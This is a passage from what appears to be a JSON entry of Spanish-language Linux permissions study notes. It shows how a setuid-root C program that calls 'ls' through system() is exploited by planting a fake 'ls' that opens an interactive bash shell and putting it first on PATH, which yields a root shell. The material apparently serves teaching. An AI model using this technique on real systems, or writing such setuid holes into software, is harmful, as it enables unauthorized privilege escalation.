Ejecutar el archivo para obtener una shell con privilegios de superusuario.\r\n4. Encontrar el archivo con bit setuid.\r\n5. Crear un ejecutable que se llame \"ls\" que abra una consola interactiva\r\n6. Agregar el ejecutable al PATH\r\n\r\n\r\n```sh\r\n# Crear un archivo con bit setuid\r\nvim exploit.c\r\n# Contenido del fichero\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sys/types.h>\r\n\r\nint main() {\r\n    setuid(0);\r\n    system(\"ls /home/user\");\r\n    return 0;\r\n}\r\n# Compilar el archivo\r\ngcc exploit.c -o exploit\r\n# Establecer el propietario y el grupo\r\nsudo chown root:root exploit\r\n# Establecer el bit setuid\r\nsudo chmod u+s exploit\r\n# Ejecutar el archivo\r\n./exploit\r\n# Encontrar archivos con bit setuid\r\nfind / -type f -perm -4001 2> /dev/null\r\n# Crear un ejecutable que abra una consola interactiva\r\nvim ls\r\n# Contenido del fichero\r\n#!/bin/bash\r\n/bin/bash -i\r\n# Damos permisos de ejecución\r\nchmod +x ls\r\n# Agregar al PATH\r\nexport PATH=/home/user:$PATH\r\n# Ejecutamos exploit con el usuario user\r\n./exploit\r\n```\r\n",
    "path": "/linux/users_permissions"
  }
]